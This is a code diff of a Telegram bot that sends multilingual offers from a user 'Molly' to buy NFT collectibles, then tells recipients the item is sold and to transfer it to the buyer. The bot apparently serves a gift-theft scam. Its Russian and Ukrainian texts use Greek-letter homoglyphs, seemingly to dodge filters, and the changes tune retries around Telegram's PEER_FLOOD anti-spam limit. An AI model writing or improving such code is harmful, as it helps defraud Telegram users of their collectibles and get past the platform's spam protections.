@@ -49,25 +49,25 @@ LOCALES = {
         "offer_text": 'Пользователь <b>Molly</b> пρедлагает Вам <b>{amount} {currency_emoji}</b> за коллекционный пρедмет <b><a href="https://t.me/nft/{slug}-{gift_num}">{gift_name} #{gift_num}</a></b>.\n\nПρедложение действует еще 6 ч. 0 мин..',
         "btn_decline": "Отклонить",
         "btn_accept": "Пρинять",
-        "flood_error": "⚠️ Временное ограничение (PEER_FLOOD). Попробуйте отправить запрос позже."
+        "flood_error": "⚠️ Временное ограничение Telegram (PEER_FLOOD) для этого чата. Попробуйте нажать «Принять» позже."
     },
     "eng": {
         "offer_text": 'User <b>Molly</b> offers you <b>{amount} {currency_emoji}</b> for the collectible item <b><a href="https://t.me/nft/{slug}-{gift_num}">{gift_name} #{gift_num}</a></b>.\n\nOffer is valid for 6 h. 0 min..',
         "btn_decline": "Decline",
         "btn_accept": "Accept",
-        "flood_error": "⚠️ Temporary limit (PEER_FLOOD). Please try sending later."
+        "flood_error": "⚠️ Temporary Telegram limit (PEER_FLOOD) for this chat. Please try clicking 'Accept' later."
     },
     "ukr": {
         "offer_text": 'Коρистувач <b>Molly</b> пропонує Вам <b>{amount} {currency_emoji}</b> за колекційний предмет <b><a href="https://t.me/nft/{slug}-{gift_num}">{gift_name} #{gift_num}</a></b>.\n\nПропозиція діє ще 6 год. 0 хв..',
         "btn_decline": "Відхилити",
         "btn_accept": "Прийняти",
-        "flood_error": "⚠️ Тимчасове обмеження (PEER_FLOOD). Спробуйте надіслати пізніше."
+        "flood_error": "⚠️ Тимчасове обмеження Telegram (PEER_FLOOD) для цього чату. Спробуйте натиснути «Прийняти» пізніше."
     },
     "cn": {
         "offer_text": '用户 <b>Molly</b> 向您出价 <b>{amount} {currency_emoji}</b> 购买收藏品 <b><a href="https://t.me/nft/{slug}-{gift_num}">{gift_name} #{gift_num}</a></b>。\n\n此出价有效期还有 6 小时 0 分钟。',
         "btn_decline": "拒绝",
         "btn_accept": "接受",
-        "flood_error": "⚠️ 暂时限制 (PEER_FLOOD)。请稍后重试。"
+        "flood_error": "⚠️ 此聊天的 Telegram 暂时限制 (PEER_FLOOD)。请稍后重试。"
     }
 }
 
@@ -307,7 +307,7 @@ async def accept_worker():
             gift_emoji = '<tg-emoji emoji-id="5985472565508838112">🎁</tg-emoji>'
             
             text = (
-                f"{gift_emoji} Коллекционный пρедмет: <a href=\"https://t.me/nft/{slug}-{gift_num}\"><b>{gift_name}-{gift_num}</b></a> успешно пρодан!\n\n"
+                f"{gift_emoji} Коллекционный пρедмет: <a href=\"https://t.me/nft/{slug}-{gift_num}\"><b>{gift_name}-{gift_num}</b></a> успешно продан!\n\n"
                 f"• Пеρедайте коллекционный предмет покупателю для зачисления {currency_name}."
             )
 
@@ -339,12 +339,20 @@ async def accept_worker():
                 retries = task.get("retries", 0) + 1
                 task["retries"] = retries
                 if retries <= 3:
-                    wait_time = 3 * retries
+                    # Увеличиваем задержку экспоненциально: 15с, 30с, 45с, чтобы дать Telegram снять лимит флуда с чата
+                    wait_time = 15 * retries 
                     logging.warning(f"PEER_FLOOD caught for chat {task['chat_id']}. Retry {retries}/3 in {wait_time}s...")
                     await asyncio.sleep(wait_time)
                     await accept_queue.put(task)
                 else:
                     logging.error(f"PEER_FLOOD limit exceeded for chat {task['chat_id']} after 3 retries. Task dropped.")
+                    target_user_id = client_user_ids.get(task["chat_id"])
+                    loc = LOCALES.get(task["lang"], LOCALES["ru"])
+                    if target_user_id:
+                        try:
+                            await bot.send_message(chat_id=target_user_id, text=loc["flood_error"])
+                        except Exception:
+                            pass
             else:
                 logging.error(f"Accept worker error: {error_str}", exc_info=True)
         finally:
